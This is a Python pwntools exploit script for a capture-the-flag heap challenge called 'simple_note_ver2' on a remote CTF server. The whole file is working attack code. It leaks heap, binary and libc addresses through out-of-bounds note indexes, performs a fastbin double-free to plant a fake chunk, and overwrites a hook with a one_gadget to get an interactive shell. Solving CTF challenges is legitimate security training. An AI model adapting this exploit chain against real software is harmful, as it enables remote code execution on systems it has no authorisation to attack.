#usr/bin/python

from pwn import *

r = remote('pwn2.chal.ctf.westerns.tokyo',18554)
#r = process('./simple_note_ver2-b6969ee04ad4140c3fd6bdb01757b8b000193dc12d4eca0a5ae6a78aa66925e6')
print util.proc.pidof(r)

def addnote(size,note):
	r.recvuntil('Your choice:')
	r.sendline('1')
	r.recvuntil('note')
	r.sendline(str(size))
	r.recvuntil('note')
	r.send(note)

def shownote(idx):
	r.recvuntil('Your choice:')
	r.sendline('2')
	r.recvuntil('note')
	r.sendline(str(idx))

def delnote(idx):
	r.recvuntil('Your choice:')
	r.sendline('3')
	r.recvuntil('note')
	r.sendline(str(idx))

addnote(0x60,'A') #note 0
addnote(0x60,'B') #note 1
#addnote(0x60,'C') #note 2
delnote(1)
delnote(0)
addnote(0x60,'\n') #note 4
shownote(0)

junk = r.recvuntil('Content:')
leak = u64(r.recvn(6).strip().ljust(8,'\x00'))*0x100+0x10
log.info('heap leak is:%s' % hex(leak))

shownote(-11)
junk = r.recvuntil('Content:')
text_addr = u64(r.recvn(6).strip().ljust(8,'\x00'))-0x8
note_array_addr = text_addr + 0x60
log.info('text address is:%s' % hex(text_addr))
log.info('note array address is:%s' % hex(note_array_addr))

getchar_got_addr = text_addr - 0x60 + 0x18
log.info('getchar got address is:%s' % hex(getchar_got_addr))

delnote(0)
payload = ''
payload += p64(getchar_got_addr) + p64(leak+0x70)
addnote(0x60,payload)

index = (leak - note_array_addr)/8
shownote(index)
junk = r.recvuntil('Content:')
getchar_addr = u64(r.recvn(6).strip().ljust(8,'\x00'))
log.info('getchar address is:%s' % hex(getchar_addr))
libc_base = getchar_addr - 0x76160
log.info('libc base is:%s' % hex(libc_base))
one_gadget = libc_base + 0xf0274
log.info('one gadget address is:%s' % hex(one_gadget))

index = (leak + 8 - note_array_addr)/8
delnote(0)
delnote(index)

fake_chunk_header = libc_base + 0x3c4aed
log.info('fake chunk header is:%s' % hex(fake_chunk_header))
payload = ''
payload += 'A'*19
payload += p64(one_gadget)
addnote(0x60,p64(fake_chunk_header))

addnote(0x60,'A')
addnote(0x60,'B')
addnote(0x60,payload)

delnote(0)
delnote(2)

r.interactive()